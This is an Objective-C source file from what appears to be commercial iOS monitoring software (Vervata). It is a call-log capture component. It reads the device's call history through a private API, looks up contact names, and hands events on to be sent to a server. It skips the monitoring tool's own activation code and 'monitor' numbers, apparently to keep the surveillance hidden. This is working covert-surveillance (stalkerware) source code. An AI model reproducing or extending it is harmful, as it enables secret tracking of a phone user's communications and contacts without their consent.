/**
 - Project name :  CallLogCapture 
 - Class name   :  CallLogCaptureManager
 - Version      :  1.0  
 - Purpose      :  For Call Log Capturing Component
 - Copy right   :  30/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "CallLogCaptureManager-E.h"
#import "CallLog.h"
#import "HistoricalCallLog.h"
#import "FxLogger.h"
#import "FxEventEnums.h"
#import "FxCallLogEvent.h"
#import "DateTimeFormat.h"
#import "CTCall.h"
#import "ABContactsManager.h"
#import "TelephoneNumber.h"
#import "CTCall.h"
#import "CHManager.h"
#import "CHRecentCall.h"

#import <UIKit/UIKit.h>

@interface CallLogCaptureManager (PrivateAPI)
- (void) sendCallLogEvent:(CallLog *) aCallLog withCallDate:(NSDate *)aCallDate;
- (BOOL) isNotOperatorServicesWithTelePhonyNumber:(NSString *) aNumber1 
								   databaseNumber:(NSString *) aNumber2
									callDirection:(FxEventDirection) aDirection;
+ (NSArray *) toFxEvent: (NSArray *) aCallLogs;
@end

@implementation CallLogCaptureManager

@synthesize mAC;
@synthesize mNotCaptureNumbers, mCurrentOutgoingAddress, mCurrentIncomingAddress;
@synthesize mCallHistoryMaxRowID;

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the CallLogCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
*/

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
	}
	return self;
}

/**
 - Method name: captureCall
 - Purpose:This method is used to capture Call Logs
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void)captureCall {
    CHManager *manager = [[CHManager alloc] init];
    //Get calllogs array from private api
    NSArray *allCallLogs = (NSArray *)[manager fetchRecentCallsSyncWithCoalescing:YES];

    //Filter out call logs that is not a normal phone call (Example: Facetime)
    NSArray *phoneCalls = [allCallLogs filteredArrayUsingPredicate:[NSPredicate predicateWithFormat:@"callType == 1"]];
    
    if (phoneCalls.count > 0) {
        //Get last captured call log timestamp and array
        NSInteger lastCallTimeStamp = -1;
        NSArray *lastCallLogIDs = [NSArray array];
        
        NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
        path = [path stringByAppendingPathComponent:@"lastCallLogs.plist"];
        
        NSFileManager *fileManager = [NSFileManager defaultManager];
        
        if ([fileManager fileExistsAtPath:path]) {
            NSDictionary *lastCallLogDic = [NSDictionary dictionaryWithContentsOfFile:path];
            lastCallTimeStamp = [lastCallLogDic[@"lastCallTimeStamp"] integerValue];
            lastCallLogIDs = lastCallLogDic[@"lastCallLogIDs"];
        }
        
        NSMutableArray *captureCallLogIDArray = [NSMutableArray array];
        __block NSInteger captureCallLogTimeStamp = -1;
        
        //For first time capture the lastest call
        if (lastCallTimeStamp == -1) {
            CHRecentCall *lastestCall =  phoneCalls[0];
            [self processCallLogObject:lastestCall];
            [captureCallLogIDArray addObject:lastestCall.uniqueId];
            captureCallLogTimeStamp = [lastestCall.date timeIntervalSince1970];
        }
        else {//After first time we have to check all calls that newer than last timestamp
            [phoneCalls enumerateObjectsUsingBlock:^(CHRecentCall *call, NSUInteger idx, BOOL *stop) {
                __block BOOL isCaptured = NO;
                NSString *callUniqueID = call.uniqueId;
                
                if ([call.date timeIntervalSince1970] >= lastCallTimeStamp) {
                    [lastCallLogIDs enumerateObjectsUsingBlock:^(NSString *capturedCallUniqueID, NSUInteger idx, BOOL *stop) {
                        if ([callUniqueID isEqualToString:capturedCallUniqueID]) {
                            isCaptured = YES;
                            *stop = YES;
                        }
                    }];
                    
                    if (!isCaptured) {
                        [self processCallLogObject:call];
                        [captureCallLogIDArray addObject:callUniqueID];
                        
                        if (captureCallLogTimeStamp == -1 ){
                            captureCallLogTimeStamp = [call.date timeIntervalSince1970];
                        }
                    }
                }
            }];
        }
        
        if (captureCallLogTimeStamp > -1 && captureCallLogIDArray.count > 0) {
            NSDictionary *lastCallLogDic = @{@"lastCallTimeStamp": [NSNumber numberWithInteger:captureCallLogTimeStamp],
                                             @"lastCallLogIDs" : captureCallLogIDArray};
            
            NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
            path = [path stringByAppendingPathComponent:@"lastCallLogs.plist"];
            
            [lastCallLogDic writeToFile:path atomically:YES];
        }
    }
    
    [manager release];
    manager = nil;
}

- (void) processCallLogObject: (CHRecentCall *) aCall {
    DLog(@"Process Call Log Event")
    
	if (aCall) {
		NSInteger callType = aCall.callType;
        
		if(callType == 1) {// Type 1 is a normal phonecall

			NSString * telNumber = nil;
            telNumber = aCall.callerId;
			
			CallLog *callLog = [[CallLog alloc] init];
            
            callLog.mContactNumber = aCall.callerId;
            callLog.mDuration = aCall.duration;
            callLog.mContactID = -1;
            
            //Incoming Call
            if (aCall.callStatus == 1) {
                callLog.mCallState = kEventDirectionIn;
            }//Outgoing Call
            else if (aCall.callStatus == 2 || aCall.callStatus == 16) {
                callLog.mCallState = kEventDirectionOut;
            }//Missed Call
            else if (aCall.callStatus == 8) {
                callLog.mCallState = kEventDirectionMissedCall;
            }
            else {
                callLog.mCallState = kEventDirectionUnknown;
            }
            
			NSArray *callLogs = [NSArray arrayWithObjects:callLog, nil];
			
			// Private number is shown as 'Blocked' but its number is null
			DLog (@"telNumber           = %@", telNumber);
            DLog (@"db.number           = %@", [callLog mContactNumber]);
            DLog (@"NOT capture numbers = %@", [self mNotCaptureNumbers]);
            DLog (@"direction           = %d", [callLog mCallState]);
			DLog (@"callLog             = %@", callLog);
            DLog (@"callLogs            = %@", callLogs);
			DLog (@"contact ID          = %ld", (long)[callLog mContactID]);
            
			// Voice mail (AIS Thailand = 90099)
			BOOL isNotOperatorServicesNumber = [self isNotOperatorServicesWithTelePhonyNumber:telNumber
																			   databaseNumber:[callLog mContactNumber]
																				callDirection:[callLog mCallState]];
			BOOL isNotCaptureNumber = FALSE;
				
			// -- check monitor numbers only when it's NO outgoing call
			if ([callLog mCallState] != kEventDirectionOut) {
				
				TelephoneNumber *telNumberCompare = [[[TelephoneNumber alloc] init] autorelease];
				for (NSString *number in [self mNotCaptureNumbers]) {
					isNotCaptureNumber = [telNumberCompare isNumber:telNumber matchWithMonitorNumber:number];
					if (isNotCaptureNumber) {
						break;
					}
				}
			// -- check *#900900900 when it is outgoing call
			} 
			/*else if ([callLog mCallState] == kEventDirectionOut) {
				if ([telNumber isEqualToString:_FULLDEFAULTACTIVATIONCODE_]) {
					isNotCaptureNumber = YES;
				}
			}
			*/
            
			/*
			 1. Private number ==> Capture
			 2. Activation code number ==> Not capture
			 3. Voice mail number ==> Not capture
			 4. Number in self.mNotCaptureNumbers ==> Not capture
			 5. Incoming call of monitor number ==> Not capture
			 6. *#900900900 ==> Not capture
			 */
			
			if([callLogs count]							&&
			   ![telNumber isEqualToString:[self mAC]]	&&
			   isNotOperatorServicesNumber				&&
			   !isNotCaptureNumber						) {
                
				if ([telNumber length] == 0) {
					// Private number
					DLog (@"Send call event to server as private number, telNumber = %@", telNumber);
					NSString *version = [[UIDevice currentDevice] systemVersion];
					if ([version intValue] >= 7) {
						[callLog setMContactNumber:@"No Caller ID"];
					} else {
						[callLog setMContactNumber:@"Blocked"];
					}
					[self sendCallLogEvent:callLog withCallDate:aCall.date];
				} else {
					// Not voice mail number, not activation code number, not in self.mNotCaptureNumbers
					DLog (@"Send call event to server as normal number, telNumber = %@", telNumber);
					[self sendCallLogEvent:callLog withCallDate:aCall.date];
				}
			}
            
            [callLog release];
            callLog = nil;
		}
	}
}

/**
 - Method name: isNotOperatorServicesWithTelePhonyNumber:databaseNumber:callDirection:
 - Purpose: This method is  used to check whether the call event is voice mail, operator defined numbers...
				which never insert into call history database
 - Argument list and description: aNumber1 (NSStrinbg *), aNumber2 (NSString *), aDirection of the call
 - Return description: BOOL
*/
 
- (BOOL) isNotOperatorServicesWithTelePhonyNumber:(NSString *) aNumber1 
								   databaseNumber:(NSString *) aNumber2
									callDirection:(FxEventDirection) aDirection {
	DLog (@"aNumber1 = %@, aNumber2 = %@, aDirection = %d", aNumber1, aNumber2, aDirection);
	if (aDirection==kEventDirectionOut) {
	   if (![aNumber1 isEqualToString:aNumber2]) 
		 return NO;
	}
	return YES;
}

/**
 - Method name: sendCallLogEvent
 - Purpose:This method is  used to send Call Log Event
 - Argument list and description: aCallLog (CallLog)
 - Return description: No return type
*/

- (void) sendCallLogEvent:(CallLog *) aCallLog withCallDate:(NSDate *)aCallDate{
	ABContactsManager *contactManager=[[ABContactsManager alloc]init];
	//DLog (@"Contact Name:--->%@",[contactManager searchContactName:[aCallLog mContactNumber]]);
//	DLog (@"Contact Name:--->%@",[contactManager searchFirstNameLastName:[aCallLog mContactNumber]]);
    DLog (@"Contact Name:--->%@",[contactManager searchFirstNameLastName:[aCallLog mContactNumber] contactID:[aCallLog mContactID]]);
	DLog (@"Contact Number:--->%@",[contactManager formatSenderNumber:[aCallLog mContactNumber]]);
	DLog (@"Duration:---->%lu",(unsigned long)[aCallLog mDuration]);
	DLog (@"Event Direction---->%d",[aCallLog mCallState]);
	//===========================================Create FxCallLog Event===============================================================
	FxCallLogEvent *callEvent=[[FxCallLogEvent alloc] init];
	NSString *formatNumber= [aCallLog mContactNumber];
	NSString *contactName= @"";
	if ([formatNumber length]>1) {
		//contactName=[contactManager searchContactName:formatNumber];
//		contactName=[contactManager searchFirstNameLastName:formatNumber];
        contactName=[contactManager searchFirstNameLastName:formatNumber contactID:[aCallLog mContactID]];
	}
	[callEvent setContactName:contactName];
	[callEvent setContactNumber:[contactManager formatSenderNumber:[aCallLog mContactNumber]]];
	[callEvent setDateTime:[DateTimeFormat phoenixDateTime:aCallDate]];
	[callEvent setDuration:[aCallLog mDuration]];
	[callEvent setDirection:[aCallLog mCallState]];
	[callEvent setEventType:kEventTypeCallLog];
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:callEvent withObject:self];
	}
	//======================================================Print Result=================================================================
//	NSString *resultString=[NSString stringWithFormat:@"...\nContact Name:%@,ContactNumber:%@,Duraction:%d,Direction:%d,DateTime:%@....\n",
//							 contactName,[aCallLog mContactNumber],[aCallLog mDuration],
//							 [aCallLog mCallState],[DateTimeFormat phoenixDateTime]];
//	FxLog("", "", 1, kFxLogLevelDebug,resultString);
	//==================================================================================================================================
	[contactManager release];
	contactManager=nil;
	[callEvent release];
	callEvent=nil;
}


#pragma mark - Request Historical Events

+ (NSArray *) toFxEvent: (NSArray *) aCallLogs {
    ABContactsManager *contactManager   = [[ABContactsManager alloc]init];
    NSMutableArray *fxeventEventArray   = [NSMutableArray array];
    
    for (CHRecentCall *callLog in aCallLogs) {
        DLog (@"Contact Name:--->%@",[contactManager searchFirstNameLastName:[callLog callerId] contactID:-1]);
        DLog (@"Contact Number:--->%@",[contactManager formatSenderNumber:[callLog callerId]]);
        DLog (@"Duration:---->%lu",(unsigned long)[callLog duration]);
        DLog (@"Event Direction---->%d",[callLog callStatus]);
        
        FxCallLogEvent *callEvent   = [[FxCallLogEvent alloc] init];
        NSString *formatNumber      = callLog.callerId;
        NSString *contactName       = @"";
        
        if ([formatNumber length] > 1) {
            contactName             = [contactManager searchFirstNameLastName:formatNumber contactID:-1];
        }
        [callEvent setContactName:contactName];
        if ([[callLog callerId] length] > 0) {
            [callEvent setContactNumber:callLog.callerId];
        } else {
            if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
                [callEvent setContactNumber:@"No Caller ID"];
            } else {
                [callEvent setContactNumber:@"Blocked"];
            }
        }
        // Set datetime according to the time in Call Database
        if (callLog.date) {
            [callEvent setDateTime:[DateTimeFormat dateTimeWithDate:callLog.date]];
        } else {
            [callEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        }
        [callEvent setDuration:callLog.duration];
        
        //Incoming Call
        if (callLog.callStatus == 1) {
            callEvent.direction = kEventDirectionIn;
        }//Outgoing Call
        else if (callLog.callStatus == 2 || callLog.callStatus == 16) {
            callEvent.direction = kEventDirectionOut;
        }//Missed Call
        else if (callLog.callStatus == 8) {
            callEvent.direction = kEventDirectionMissedCall;
        }
        else {
            callEvent.direction = kEventDirectionUnknown;
        }
        
        [callEvent setEventType:kEventTypeCallLog];
        
        [fxeventEventArray addObject:callEvent];
        
        [callEvent release];
        callEvent                   = nil;
    }
    DLog(@"Before release");
    [contactManager release];
    contactManager                  = nil;
    DLog(@"After release");
    return fxeventEventArray;
}

+ (NSArray *) allCalls {
    CHManager *manager = [[CHManager alloc] init];
    
    NSArray *allCallLogs = (NSArray *)[manager fetchRecentCallsSyncWithCoalescing:YES];
    [manager release];
    manager = nil;
    
    NSArray *phoneCalls = [allCallLogs filteredArrayUsingPredicate:[NSPredicate predicateWithFormat:@"callType == 1"]];
    
    NSArray *fxCallLogs = [self toFxEvent:phoneCalls];
    
    return fxCallLogs;
}

+ (NSArray *) allCallsWithMax: (NSInteger) aMaxNumber {
    CHManager *manager = [[CHManager alloc] init];
    NSArray *allCallLogs = (NSArray *)[manager fetchRecentCallsSyncWithCoalescing:YES];
    [manager release];
    manager = nil;
    
    NSArray *phoneCalls = [allCallLogs filteredArrayUsingPredicate:[NSPredicate predicateWithFormat:@"callType == 1"]];
    
    if (aMaxNumber > phoneCalls.count) {
        aMaxNumber = phoneCalls.count;
    }
    
    NSArray *fxCallLogs = [self toFxEvent:[phoneCalls subarrayWithRange:NSMakeRange(0, aMaxNumber)]];
    
    return fxCallLogs;
}


#pragma mark - Clear Util

+ (void)clearCapturedData
{
    // Remove last capture time stemp for each event
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    
    //Call log
    if (![fileManager removeItemAtPath:[path stringByAppendingPathComponent:@"lastCallLogs.plist"] error:&error]) {
        DLog(@"Remove last call logs plist error with %@", [error localizedDescription]);
    }
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/
- (void) dealloc {
	[mAC release];
	[mNotCaptureNumbers release];
    self.mCurrentOutgoingAddress = nil;
    self.mCurrentIncomingAddress = nil;
	[super dealloc];
}

@end
